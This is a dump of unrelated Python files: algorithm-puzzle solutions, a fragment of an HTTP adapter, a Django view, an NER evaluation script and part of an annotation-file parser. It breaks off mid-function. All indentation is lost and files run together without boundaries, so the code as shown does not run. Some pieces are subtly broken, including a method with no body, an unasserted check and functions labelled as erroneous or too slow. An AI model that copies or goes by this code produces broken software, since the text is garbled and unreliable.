T, R, B, L = range(4)
for i in range(m):
for j in range(n):
e = grid[i][j]
if e == "/" or e == " ":
ds.union((i, j, B), (i, j, R))
ds.union((i, j, T), (i, j, L))
if e == "\\" or e == " ":
ds.union((i, j, T), (i, j, R))
ds.union((i, j, B), (i, j, L))
if i - 1 >= 0:
ds.union((i, j, T), (i-1, j, B))
if j - 1 >= 0:
ds.union((i, j, L), (i, j-1, R))
return len(set(
ds.find(x)
for x in ds.pi.keys()
))
if __name__ == "__main__":
assert Solution().regionsBySlashes([
" /",
"/ "
]) == 2
assert Solution().regionsBySlashes([
"//",
"/ "
]) == 3
from typing import List
class Solution:
def repeatedNTimes(self, A: List[int]) -> int:
n = len(A)
for i in range(n - 1):
for j in range(3):
if A[i] == A[min(n - 1, i + 1 + j)]:
return A[i]
raise
if __name__ == "__main__":
assert Solution().repeatedNTimes([1,2,3,3]) == 3
from typing import List
class Solution:
def maxWidthRamp(self, A: List[int]) -> int:
ret = -float("inf")
V = [(a, i) for i, a in enumerate(A)]
V.sort()
min_idx = float("inf")
for _, i in V:
ret = max(ret, i - min_idx)
min_idx = min(min_idx, i)
return max(ret, 0)
from functools import lru_cache
class Solution:
def leastOpsExpressTarget(self, x: int, target: int) -> int:
return self.dfs(target, x, 0) - 1
@lru_cache(maxsize=None)
def dfs(self, target, x, power):
if target == 0:
return 0
if target == 1:
return self.ops(power)
d, r = target // x, target % x
ret = r * self.ops(power) + self.dfs(d, x, power + 1)
if r != 0:
ret2 = (x - r) * self.ops(power) + self.dfs(d + 1, x, power + 1)
ret = min(ret, ret2)
return ret
def ops(self, power):
if power == 0:
return 2
else:
return power
if __name__ == "__main__":
assert Solution().leastOpsExpressTarget(3, 19) == 5
assert Solution().leastOpsExpressTarget(5, 501) == 8
assert Solution().leastOpsExpressTarget(2, 125046) == 50
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def isUnivalTree(self, root: TreeNode) -> bool:
return self.dfs(root, root.val if root else None)
def dfs(self, node, val) -> bool:
if not node:
return True
if node.val != val:
return False
return self.dfs(node.left, val) and self.dfs(node.right, val)
from typing import List
class Solution:
def __init__(self):
self.cache = {}
def numsSameConsecDiff(self, N: int, K: int) -> List[int]:
ret = []
for i in range(1, 10):
ret.extend(self.dfs(i, N, K))
if N == 1:
ret.append([0])
return list(
map(lambda x: int("".join(map(str, x))), ret)
)
def dfs(self, start: int, N: int, K: int) -> List[List[int]]:
if (start, N, K) not in self.cache:
ret = []
if N == 1:
ret = [[start]]
elif N > 1:
if start + K <= 9:
for e in self.dfs(start + K, N - 1, K):
ret.append([start] + e)
if start - K >= 0 and K != 0:
for e in self.dfs(start - K, N - 1, K):
ret.append([start] + e)
self.cache[start, N, K] = ret
return self.cache[start, N, K]
if __name__ == "__main__":
Solution().numsSameConsecDiff(3, 7) == [181,292,707,818,929]
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.covered = {None}
self.cnt = 0
def minCameraCover(self, root: TreeNode) -> int:
self.dfs(root, None)
if root not in self.covered:
self.covered.add(root)
self.cnt += 1
return self.cnt
def dfs(self, node, pi):
if not node:
return
self.dfs(node.left, node)
self.dfs(node.right, node)
if node.left not in self.covered or node.right not in self.covered:
self.cnt += 1
self.covered.add(node.left)
self.covered.add(node.right)
self.covered.add(node)
self.covered.add(pi)
class SolutionErrror:
def __init__(self):
self.covered = set()
def minCameraCover(self, root: TreeNode) -> int:
dummy = TreeNode(0)
dummy.left = root
self.dfs(root, dummy)
self.covered.discard(dummy)
return len(self.covered)
def dfs(self, node, pi):
if not node:
return
self.dfs(node.left, node)
self.dfs(node.right, node)
if (
(not node.left or node.left in self.covered) and
(not node.right or node.right in self.covered)
):
self.covered.add(pi)
return
from typing import List
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = []
self.i = 0
def flipMatchVoyage(self, root: TreeNode, voyage: List[int]) -> List[int]:
self.dfs(root, voyage)
return self.ret
def dfs(self, node, voyage):
if not node:
return
if node.val != voyage[self.i]:
self.ret = [-1]
return
self.i += 1
if node.left and node.right and node.left.val != voyage[self.i]:
self.ret.append(node.val)
self.dfs(node.right, voyage)
self.dfs(node.left, voyage)
else:
self.dfs(node.left, voyage)
self.dfs(node.right, voyage)
from typing import List
import heapq
class Solution:
def kClosest(self, points: List[List[int]], K: int) -> List[List[int]]:
return heapq.nsmallest(K, points, key=lambda x: x[0]**2 + x[1]**2)
from typing import List
from collections import defaultdict
class Solution:
def subarraysDivByK_2(self, A: List[int], K: int) -> int:
prefix_sum = 0
counter = defaultdict(int)
counter[0] = 1
for a in A:
prefix_sum += a
prefix_sum %= K
counter[prefix_sum] += 1
ret = 0
for v in counter.values():
ret += v * (v-1) // 2
return ret
def subarraysDivByK(self, A: List[int], K: int) -> int:
prefix_sum = 0
counter = defaultdict(int)
counter[0] = 1
ret = 0
for a in A:
prefix_sum += a
prefix_sum %= K
ret += counter[prefix_sum]
counter[prefix_sum] += 1
return ret
from typing import List
class Solution:
def largestPerimeter(self, A: List[int]) -> int:
A.sort()
for i in range(len(A) - 3, -1, -1):
if A[i] + A[i+1] > A[i+2]:
return sum(A[i:i+3])
else:
return 0
from typing import List
from collections import deque
class Solution:
def sortedSquares(self, A: List[int]) -> List[int]:
n = len(A)
ret = deque()
lo = 0
hi = n
while lo < hi:
if A[lo] ** 2 < A[hi - 1] ** 2:
ret.appendleft(A[hi - 1] ** 2)
hi -= 1
else:
ret.appendleft(A[lo] ** 2)
lo += 1
return list(ret)
from typing import List
class Solution:
def maxTurbulenceSize(self, A: List[int]) -> int:
flag = None
ret = 1
cur = 1
for i in range(len(A)-1):
if A[i] == A[i+1]:
flag = None
cur = 1
elif A[i] > A[i+1]:
if flag is None or flag == 1:
cur += 1
ret = max(ret, cur)
else:
cur = 2
flag = 0
else:
if flag is None or flag == 0:
cur += 1
ret = max(ret, cur)
else:
cur = 2
flag = 1
return ret
if __name__ == "__main__":
assert Solution().maxTurbulenceSize([9,4,2,10,7,8,8,1,9]) == 5
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.ret = 0
def distributeCoins(self, root: TreeNode) -> int:
self.demand(root)
return self.ret
def demand(self, node) -> int:
if not node:
return 0
demand_l = self.demand(node.left)
demand_r = self.demand(node.right)
demand_m = 1 - node.val
demand = demand_l + demand_r + demand_m
self.ret += abs(demand)
return demand
import bisect
from collections import defaultdict
class TimeMap:
def __init__(self):
self.m = defaultdict(list)
def set(self, key: str, value: str, timestamp: int) -> None:
n = (timestamp, value)
bisect.insort(self.m[key], n)
def get(self, key: str, timestamp: int) -> str:
if key not in self.m:
return ""
lst = self.m[key]
i = bisect.bisect(lst, (timestamp, ""))
if i < len(lst) and lst[i][0] == timestamp:
return lst[i][1]
i -= 1
if i >= 0:
return lst[i][1]
return ""
from typing import List
class Solution:
def mincostTickets(self, days: List[int], costs: List[int]) -> int:
F = [float("inf") for _ in range(366 + 30)]
for i in range(366, 366 + 30):
F[i] = 0
days_set = set(days)
for i in range(365, 0, -1):
if i not in days_set:
F[i] = F[i+1]
else:
F[i] = min(
c + F[i+d]
for d, c in zip([1, 7, 30], costs)
)
return F[1]
def mincostTickets_error(self, days: List[int], costs: List[int]) -> int:
n = len(days)
F = [float("inf") for _ in range(n)]
F[-1] = costs[0]
for i in range(n-2, -1, -1):
for j in range(i+1, n):
delta = days[j] - days[i]
if delta <= 1:
F[i] = min(F[i], costs[0] + F[j])
if delta <= 7:
F[i] = min(F[i], costs[1] + F[j])
if delta <= 30:
F[i] = min(F[i], costs[2] + F[j])
else:
break
return F[0]
def mincostTickets_error(self, days: List[int], costs: List[int]) -> int:
F = [float("inf") for _ in range(365 + 1)]
F[0] = 0
days_set = set(days)
for i in range(1, 366):
if i not in days_set:
F[i] = F[i-1]
else:
F[i] = min(F[i], F[i-1] + costs[0])
if __name__ == "__main__":
assert Solution().mincostTickets([1,4,6,7,8,20], [2,7,15]) == 11
from typing import List
class Solution:
def sumEvenAfterQueries(self, A: List[int], queries: List[List[int]]) -> List[int]:
cur_sum = sum(filter(lambda x: x % 2 == 0, A))
ret = []
for val, idx in queries:
prev = A[idx]
if prev % 2 == 0:
cur_sum -= prev
A[idx] += val
if A[idx] % 2 == 0:
cur_sum += A[idx]
ret.append(cur_sum)
return ret
from typing import List
class Interval:
def __init__(self, s=0, e=0):
self.start = s
self.end = e
class Solution:
def intervalIntersection(self, A: List[Interval], B: List[Interval]) -> List[Interval]:
i, j = 0, 0
m, n = len(A), len(B)
ret = []
while i < m and j < n:
lo = max(A[i].start, B[j].start)
hi = min(A[i].end, B[j].end)
if lo <= hi:
ret.append(Interval(lo, hi))
if A[i].end > B[j].end:
j += 1
else:
i += 1
return ret
def intervalIntersection_complex(self, A: List[Interval], B: List[Interval]) -> List[Interval]:
ret = []
i = 0
j = 0
m, n = len(A), len(B)
while i < m and j < n:
a = A[i]
b = B[j]
if b.start <= a.end <= b.end:
ret.append(Interval(max(a.start, b.start), a.end))
i += 1
elif a.start <= b.end <= a.end:
ret.append(Interval(max(a.start, b.start), b.end))
j += 1
else:
if a.end < b.start:
i += 1
else:
j += 1
return ret
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from collections import defaultdict
class Solution:
def __init__(self):
self.mp = defaultdict(list)
def verticalTraversal(self, root: TreeNode) -> List[List[int]]:
self.dfs(root, 0, 0)
ret = []
mn = min(self.mp)
mx = max(self.mp)
for i in range(mn, mx+1):
ret.append([
val
for _, val in sorted(self.mp[i])
])
return ret
def dfs(self, node, x, y):
if not node:
return
self.mp[x].append((-y, node.val))
self.dfs(node.left, x-1, y-1)
self.dfs(node.right, x+1, y-1)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
from typing import Tuple
from collections import deque
class Solution:
def __init__(self):
self.mn: Tuple[int] = None
def smallestFromLeaf(self, root: TreeNode) -> str:
self.dfs(root, deque())
if not self.mn:
return ""
return "".join(
chr(e + ord("a"))
for e in self.mn
)
def dfs(self, node, cur_deque):
if not node:
return
cur_deque.appendleft(node.val)
if not node.left and not node.right:
t = tuple(cur_deque)
if not self.mn or t < self.mn:
self.mn = t
else:
self.dfs(node.left, cur_deque)
self.dfs(node.right, cur_deque)
cur_deque.popleft()
from typing import List
from collections import deque
class Solution:
def addToArrayForm(self, A: List[int], K: int) -> List[int]:
carry = K
for i in range(len(A)-1, -1, -1):
A[i] += carry
carry = A[i] // 10
A[i] %= 10
head = deque()
while carry:
head.appendleft(carry % 10)
carry //= 10
return list(head) + A
from typing import List
class DisjointSet:
def __init__(self):
self.pi = {}
def union(self, x, y):
self.pi[self.find(x)] = self.find(y)
def find(self, x):
if x not in self.pi:
self.pi[x] = x
elif self.pi[x] != x:
self.pi[x] = self.find(self.pi[x])
return self.pi[x]
class Solution:
def equationsPossible(self, equations: List[str]) -> bool:
ds = DisjointSet()
neqs = []
for e in equations:
a = e[0]
b = e[-1]
sign = e[1:-1]
if sign == "==":
ds.union(a, b)
else:
neqs.append((a, b))
for a, b in neqs:
if ds.find(a) == ds.find(b):
return False
return True
class Solution:
def brokenCalc(self, X: int, Y: int) -> int:
t = 0
while Y > X:
if Y % 2 == 0:
Y //= 2
else:
Y += 1
t += 1
return t + X - Y
def brokenCalc_TLE(self, X: int, Y: int) -> int:
q = [X]
t = 0
has_larger = False
while q:
cur_q = []
for e in q:
if e == Y:
return t
cur = e * 2
if cur >= 1:
if cur > Y and not has_larger:
has_larger = True
cur_q.append(cur)
elif cur <= Y:
cur_q.append(cur)
cur = e - 1
if cur >= 1:
cur_q.append(cur)
q = cur_q
t += 1
raise
if __name__ == "__main__":
assert Solution().brokenCalc(2, 3) == 2
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def __init__(self):
self.pi = []
self.depths = []
def isCousins(self, root: TreeNode, x: int, y: int) -> bool:
self.dfs(None, root, x, 0)
self.dfs(None, root, y, 0)
if len(self.pi) != 2:
return False
return self.pi[0] != self.pi[1] and self.depths[0] == self.depths[1]
def dfs(self, pi, node, x, depth):
if not node:
return
if node.val == x:
self.pi.append(pi)
self.depths.append(depth)
return
self.dfs(node, node.left, x, depth + 1)
self.dfs(node, node.right, x, depth + 1)
from typing import List
dirs = ((0, -1), (0, 1), (-1, 0), (1, 0))
class Solution:
def orangesRotting(self, grid: List[List[int]]) -> int:
m, n = len(grid), len(grid[0])
q = []
for i in range(m):
for j in range(n):
if grid[i][j] == 2:
q.append((i, j))
t = -1
while q:
t += 1
cur_q = []
for i, j in q:
for di, dj in dirs:
I = i + di
J = j + dj
if 0 <= I < m and 0 <= J < n and grid[I][J] == 1:
grid[I][J] = 2
cur_q.append((I, J))
q = cur_q
has_fresh = any(
grid[i][j] == 1
for i in range(m)
for j in range(n)
)
return max(0, t) if not has_fresh else -1
from typing import List
from collections import defaultdict
class Solution:
def findJudge(self, N: int, trust: List[List[int]]) -> int:
ingress = defaultdict(set)
egress =defaultdict(set)
for p, q in trust:
egress[p].add(q)
ingress[q].add(p)
for i in range(1, N+1):
if len(egress[i]) == 0 and len(ingress[i]) == N - 1:
return i
return -1
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def insertIntoMaxTree(self, root: TreeNode, val: int) -> TreeNode:
if not root:
return TreeNode(val)
if val > root.val:
node = TreeNode(val)
node.left = root
return node
root.right = self.insertIntoMaxTree(root.right, val)
return root
MOD = 10 ** 9 + 7
class Solution(object):
def solve_error(self, cipher):
N, lst = cipher
odd_cnt = len(filter(lambda x: x % 2 == 1, lst))
even_cnt = N - odd_cnt
a = (2 ** even_cnt) % MOD
result = 0
result += a - 1
i = 2
comb = (odd_cnt) * (odd_cnt - 1) / (1 * 2)
while i <= odd_cnt:
result += comb * a
result %= MOD
i += 2
comb *= (odd_cnt - i + 1) * (odd_cnt - i) / ((i - 1) * i)
comb %= MOD
return result
def solve(self, cipher):
N, lst = cipher
odd_cnt = len(filter(lambda x: x % 2 == 1, lst))
even_cnt = N - odd_cnt
a = (2 ** even_cnt) % MOD
b = (2 ** (odd_cnt - 1)) % MOD
if odd_cnt != 0:
result = a - 1 + (b - 1) * a
else:
result = a - 1
return result % MOD
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
lst = map(int, f.readline().strip().split(' '))
cipher = N, lst
s = "%s\n" % (Solution().solve(cipher))
print s,
class DisjointSet(object):
def __init__(self, n):
self.rank = [1 for _ in xrange(n)]
self.parent = [i for i in xrange(n)]
self.n = n
def find(self, i):
if i == self.parent[i]:
return i
else:
self.parent[i] = self.find(self.parent[i])
return self.parent[i]
def union(self, i, j):
x = self.find(i)
y = self.find(j)
if x == y: return
self.parent[x] = y
self.rank[y] += self.rank[x]
def card(self):
card = 0
for i in xrange(self.n):
if self.parent[i] == i:
card += 1
return card
class Solution(object):
def solve(self, cipher):
N, pairs = cipher
djs = DisjointSet(N)
for a, b in pairs:
djs.union(a, b)
result = 0
for i in xrange(N):
if djs.find(i) == i:
result += (djs.rank[i]) * (N - djs.rank[i])
return result / 2
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N, I = map(int, f.readline().strip().split(' '))
pairs = []
for i in xrange(I):
pairs.append(map(int, f.readline().strip().split(' ')))
cipher = N, pairs
s = "%s\n" % (solution.solve(cipher))
print s,
import threading
from util.commons_util.decorators.classes import *
def print_msg(name, msg):
print "%s says: %s" % (name, msg)
class AbstractThread(threading.Thread):
@Override(threading.Thread)
def __init__(self, name, production=False):
super(AbstractThread, self).__init__()
self.name = name
self.production = production
def print_msg(self, msg):
print_msg(self.name, msg)
import threading
from decorators.classes import *
def print_msg(name, msg):
print "%s says: %s" % (name, msg)
class AbstractThread(threading.Thread):
@Override(threading.Thread)
def __init__(self, name, production=False):
super(AbstractThread, self).__init__()
self.name = name
self.production = production
def print_msg(self, msg):
print_msg(self.name, msg)
class Solution(object):
def solve(self, cipher):
N, M, ppl = cipher
team_cnt = 0
max_topic = 0
for i in xrange(N):
for j in xrange(i + 1, N):
cnt = self.common_topics(M, ppl[i], ppl[j])
if cnt == max_topic:
team_cnt += 1
elif cnt > max_topic:
team_cnt = 1
max_topic = cnt
return "%d\n%d" % (max_topic, team_cnt)
def common_topics(self, M, a, b):
topic = a | b
topic_cnt = bin(topic).count("1")
return topic_cnt
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N, M = map(lambda x: int(x), f.readline().strip().split(" "))
ppl = []
for i in xrange(N):
ppl.append(int(f.readline().strip(), 2))
cipher = [N, M, ppl]
s = "%s\n" % (Solution().solve(cipher))
print s,
import socket
from .models import Response
from .packages.urllib3.poolmanager import PoolManager, proxy_from_url
from .hooks import dispatch_hook
from .compat import urlparse
from .utils import DEFAULT_CA_BUNDLE_PATH, get_encoding_from_headers
from .structures import CaseInsensitiveDict
from .packages.urllib3.exceptions import MaxRetryError
from .packages.urllib3.exceptions import TimeoutError
from .packages.urllib3.exceptions import SSLError as _SSLError
from .packages.urllib3.exceptions import HTTPError as _HTTPError
from .cookies import extract_cookies_to_jar
from .exceptions import ConnectionError, Timeout, SSLError
DEFAULT_POOLSIZE = 10
DEFAULT_RETRIES = 0
class BaseAdapter(object):
def __init__(self):
super(BaseAdapter, self).__init__()
def send(self):
raise NotImplementedError
def close(self):
raise NotImplementedError
class HTTPAdapter(BaseAdapter):
def __init__(self, pool_connections=DEFAULT_POOLSIZE, pool_maxsize=DEFAULT_POOLSIZE):
self.max_retries = DEFAULT_RETRIES
self.config = {}
super(HTTPAdapter, self).__init__()
self.init_poolmanager(pool_connections, pool_maxsize)
def init_poolmanager(self, connections, maxsize):
self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize)
def cert_verify(self, conn, url, verify, cert):
if url.startswith('https') and verify:
cert_loc = None
if verify is not True:
cert_loc = verify
if not cert_loc:
cert_loc = DEFAULT_CA_BUNDLE_PATH
if not cert_loc:
raise Exception("Could not find a suitable SSL CA certificate bundle.")
conn.cert_reqs = 'CERT_REQUIRED'
conn.ca_certs = cert_loc
else:
conn.cert_reqs = 'CERT_NONE'
conn.ca_certs = None
if cert:
if len(cert) == 2:
conn.cert_file = cert[0]
conn.key_file = cert[1]
else:
conn.cert_file = cert
def build_response(self, req, resp):
response = Response()
response.status_code = getattr(resp, 'status', None)
response.headers = CaseInsensitiveDict(getattr(resp, 'headers', {}))
response.encoding = get_encoding_from_headers(response.headers)
response.raw = resp
if isinstance(req.url, bytes):
response.url = req.url.decode('utf-8')
else:
response.url = req.url
extract_cookies_to_jar(response.cookies, req, resp)
response.request = req
response.connection = self
response = dispatch_hook('response', req.hooks, response)
return response
def get_connection(self, url, proxies=None):
proxies = proxies or {}
proxy = proxies.get(urlparse(url).scheme)
if proxy:
conn = proxy_from_url(proxy)
else:
conn = self.poolmanager.connection_from_url(url)
return conn
def close(self):
self.poolmanager.clear()
def send(self, request, stream=False, timeout=None, verify=True, cert=None, proxies=None):
conn = self.get_connection(request.url, proxies)
self.cert_verify(conn, request.url, verify, cert)
try:
resp = conn.urlopen(
method=request.method,
url=request.path_url,
body=request.body,
headers=request.headers,
redirect=False,
assert_same_host=False,
preload_content=False,
decode_content=False,
retries=self.max_retries,
timeout=timeout,
)
except socket.error as sockerr:
raise ConnectionError(sockerr)
except MaxRetryError as e:
raise ConnectionError(e)
except (_SSLError, _HTTPError) as e:
if isinstance(e, _SSLError):
raise SSLError(e)
elif isinstance(e, TimeoutError):
raise Timeout(e)
else:
raise Timeout('Request timed out.')
r = self.build_response(request, resp)
if not stream:
r.content
return r
from django.contrib import admin
from django.utils.decorators import method_decorator
from django.views.decorators.csrf import csrf_exempt
from django.views.generic import View
from decorators import json_only
class AjaxView(View):
@method_decorator(json_only)
@method_decorator(csrf_exempt)
def dispatch(self, *args, **kwargs):
return super(AjaxView, self).dispatch(*args, **kwargs)
class Solution(object):
def solve(self, cipher):
N, M, queries = cipher
qry = []
for query in queries:
qry.append((query[0], query[2]))
qry.append((query[1] + 1, -query[2]))
qry.sort(key=lambda x: (x[0], x[1]))
maxa = -1 << 32
cur = 0
for q in qry:
cur += q[1]
maxa = max(maxa, cur)
return maxa
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N, M = map(int, f.readline().strip().split(' '))
queries = []
for t in xrange(M):
queries.append(map(int, f.readline().strip().split(' ')))
cipher = N, M, queries
s = "%s\n" % (Solution().solve(cipher))
print s,
def memoize(func):
cache = {}
def ret(*args):
if args not in cache:
cache[args] = func(*args)
return cache[args]
return ret
def memoize_force(func):
cache = {}
def ret(*args):
k = str(args)
if k not in cache:
cache[k] = func(*args)
return cache[k]
return ret
def memoize_iterable(func):
cache = {}
def ret(*args):
k = tuple(args)
if k not in cache:
cache[k] = func(*args)
return cache[k]
return ret
from cross_validation import CrossValidator
import os
import re
class TotalVerifier(CrossValidator):
def verify(self):
RAW_FOLDER = "data"
INPUT_FOLDER = "auto"
OUTPUT_FOLDER = "auto-tagged-model-all"
os.system("java -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier -prop all.prop")
for non_auto_file in self.file_names:
auto_file = re.sub(r'%s'%(RAW_FOLDER), INPUT_FOLDER, non_auto_file)
auto_file = re.sub(r'\.tsv', '.txt', auto_file)
auto_file_tagged = re.sub(r'%s'%INPUT_FOLDER, OUTPUT_FOLDER, auto_file)
auto_file_tagged = re.sub(r'\.txt', '-tagged.xml', auto_file_tagged)
os.system("java -mx500m -cp ../lib/ner/stanford-ner.jar edu.stanford.nlp.ie.crf.CRFClassifier\
-loadClassifier ner-model-all.ser.gz -textFile %s -outputFormat inlineXML > %s"%(auto_file, auto_file_tagged))
def do(self):
self.verify()
if __name__=="__main__":
TotalVerifier().do()
class Solution(object):
def solve(self, cipher):
def solve_time_out(self, cipher):
A = cipher
L = [-1 for _ in A]
S = [-1 for _ in A]
for i in xrange(len(A) - 2, -1, -1):
idx = i + 1
while idx != -1:
if A[idx] < A[i]:
idx = L[idx]
else:
break
L[i] = idx
idx = i + 1
while idx != -1:
if A[idx] > A[i]:
idx = S[idx]
else:
break
S[i] = idx
cnt = 0
for i in xrange(len(A)):
cnt += 1
l = L[i]
s = S[i]
while l != -1 and (s == -1 or s > l):
cnt += 1
l = L[l]
return cnt
def solve_error(self, cipher):
A = cipher
N = len(A)
start = 0
end = 1
cnt = 0
while end < N:
if A[end] > A[end - 1]:
end += 1
else:
cnt += self.count(start, end)
start = end
end += 1
cnt += self.count(start, end)
return cnt
def count(self, start, end):
l = end - start
return (l + 1) * l / 2
if __name__ == "__main__":
import sys
f = open("0.in", "r")
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
A = cipher
N = len(A)
start = 0
while start + 1 < N and A[start] <= A[start + 1]:
start += 1
end = start + 1
while end + 1 < N and A[end] >= A[end + 1]:
end += 1
if end == start + 1:
j = start + 1
while j + 1 < N and A[j] < A[j + 1]:
j += 1
if j != start + 1 and j + 1 == N:
return "no"
i = j + 1
while i + 1 < N:
if not A[i] < A[i + 1]:
return "no"
i += 1
if j != start + 1:
j += 1
return "yes\nswap %d %d" % (start + 1, j + 1)
else:
i = end + 1
while i + 1 < N:
if not A[i] < A[i + 1]:
return "no"
i += 1
if end + 1 < N and A[start] > A[end + 1]:
return "no"
return "yes\nreverse %d %d" % (start + 1, end + 1)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
lst = list(cipher)
ret = [lst[0]]
cnt = 0
for i in xrange(1, len(lst)):
if lst[i] != ret[-1]:
ret.append(lst[i])
else:
cnt += 1
return cnt
if __name__ == "__main__":
import sys
f = open("0.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
cipher = cipher[0]
length = len(cipher)
if length & 1 == 1:
return -1
str1 = cipher[:length / 2]
str2 = cipher[length / 2:]
bucket = [0 for _ in xrange(256)]
for elt in str1:
bucket[ord(elt)] += 1
for elt in str2:
bucket[ord(elt)] -= 1
return sum(filter(lambda x: x > 0, bucket))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip().split(' ')
s = "%s\n" % (Solution().solve(cipher))
print s,
from collections import defaultdict
class Solution(object):
def anagrams(self, strs):
ret = []
cnt = defaultdict(int)
for s in strs:
enc = self.encode(s)
cnt[enc] += 1
for s in strs:
enc = self.encode(s)
if cnt[enc] > 1:
ret.append(s)
return ret
def encode(self, s):
ret = [0 for _ in xrange(26)]
for c in s:
ret[ord(c)-ord('a')] += 1
return "".join(map(str, ret))
class Solution(object):
def solve_TLE(self, cipher):
N, K, lst = cipher
lst.sort()
global_min = 1 << 32 - 1
for i in xrange(N - K):
seq = lst[i: i + K]
global_min = min(global_min, max(seq) - min(seq))
return global_min
def solve_TLE2(self, cipher):
N, K, lst = cipher
lst.sort()
seq = lst[0: K]
mini = min(seq)
maxa = max(seq)
global_min = maxa - mini
for i in xrange(K, N):
popped = seq.pop(0)
cur = lst[i]
seq.append(cur)
if popped != mini:
mini = min(mini, cur)
else:
mini = min(seq)
if popped != maxa:
maxa = max(maxa, cur)
else:
maxa = max(seq)
global_min = min(global_min, maxa - mini)
return global_min
def solve(self, cipher):
N, K, lst = cipher
lst.sort()
mini = lst[0]
maxa = lst[K - 1]
global_min = maxa - mini
for i in xrange(1, N - K):
mini = lst[i]
maxa = lst[i + K - 1]
global_min = min(global_min, maxa - mini)
return global_min
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
K = int(f.readline().strip())
lst = []
for t in xrange(N):
lst.append(int(f.readline().strip()))
cipher = (N, K, lst)
s = "%s\n" % (Solution().solve(cipher))
print s,
from __future__ import with_statement
import sys
import re
try:
import argparse
except ImportError:
from os.path import basename
from sys import path as sys_path
sys_path.append(join_path(basename(__file__), '../server/lib'))
import argparse
class ArgumentError(Exception):
def __init__(self, s):
self.errstr = s
def __str__(self):
return 'Argument error: %s' % (self.errstr)
def argparser():
ap=argparse.ArgumentParser(description="Remove portions of text from annotated files.")
ap.add_argument("-c", "--characters", metavar="[LIST]", default=None,
help="Select only these characters")
ap.add_argument("--complement", default=False, action="store_true",
help="Complement the selected spans of text")
ap.add_argument("file", metavar="FILE", nargs=1,
help="Annotation file")
return ap
class Annotation(object):
def __init__(self, id_, type_):
self.id_ = id_
self.type_ = type_
def in_range(self, _):
return True
def remap(self, _):
return None
class Textbound(Annotation):
def __init__(self, id_, type_, offsets, text):
Annotation.__init__(self, id_, type_)
self.text = text
self.offsets = []
if ';' in offsets:
raise NotImplementedError('Discontinuous annotations not supported')
assert len(offsets) == 2, "Data format error"
self.offsets.append((int(offsets[0]), int(offsets[1])))
def in_range(self, selection):
for start, end in self.offsets:
if not selection.in_range(start, end):
return False
return True
def remap(self, selection):
remapped = []
for start, end in self.offsets:
remapped.append(selection.remap(start, end))
self.offsets = remapped
def __str__(self):
return "%s\t%s %s\t%s" % (self.id_, self.type_,
';'.join(['%d %d' % (s, e)
for s, e in self.offsets]),
self.text)
class ArgAnnotation(Annotation):
def __init__(self, id_, type_, args):
Annotation.__init__(self, id_, type_)
self.args = args
class Relation(ArgAnnotation):
def __init__(self, id_, type_, args):
ArgAnnotation.__init__(self, id_, type_, args)
def __str__(self):
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.args))
class Event(ArgAnnotation):
def __init__(self, id_, type_, trigger, args):
ArgAnnotation.__init__(self, id_, type_, args)
self.trigger = trigger
def __str__(self):
return "%s\t%s:%s %s" % (self.id_, self.type_, self.trigger,
' '.join(self.args))
class Attribute(Annotation):
def __init__(self, id_, type_, target, value):
Annotation.__init__(self, id_, type_)
self.target = target
self.value = value
def __str__(self):
return "%s\t%s %s%s" % (self.id_, self.type_, self.target,
'' if self.value is None else ' '+self.value)
class Normalization(Annotation):
def __init__(self, id_, type_, target, ref, reftext):
Annotation.__init__(self, id_, type_)
self.target = target
self.ref = ref
self.reftext = reftext
def __str__(self):
return "%s\t%s %s %s\t%s" % (self.id_, self.type_, self.target,
self.ref, self.reftext)
class Equiv(Annotation):
def __init__(self, id_, type_, targets):
Annotation.__init__(self, id_, type_)
self.targets = targets
def __str__(self):
return "%s\t%s %s" % (self.id_, self.type_, ' '.join(self.targets))
class Note(Annotation):
def __init__(self, id_, type_, target, text):
Annotation.__init__(self, id_, type_)
self.target = target
self.text = text
def __str__(self):
return "%s\t%s %s\t%s" % (self.id_, self.type_, self.target, self.text)
def parse_textbound(fields):
id_, type_offsets, text = fields
type_offsets = type_offsets.split(' ')
type_, offsets = type_offsets[0], type_offsets[1:]
return Textbound(id_, type_, offsets, text)
def parse_relation(fields):
if len(fields) == 3 and not fields[2]:
fields = fields[:2]
id_, type_args = fields
type_args = type_args.split(' ')
type_, args = type_args[0], type_args[1:]
return Relation(id_, type_, args)
def parse_event(fields):
id_, type_trigger_args = fields
type_trigger_args = type_trigger_args.split(' ')
type_trigger, args = type_trigger_args[0], type_trigger_args[1:]
type_, trigger = type_trigger.split(':')
return Event(id_, type_, trigger, args)
def parse_attribute(fields):
id_, type_target_value = fields
type_target_value = type_target_value.split(' ')
if len(type_target_value) == 3:
type_, target, value = type_target_value
else:
type_, target = type_target_value
value = None
return Attribute(id_, type_, target, value)
def parse_normalization(fields):
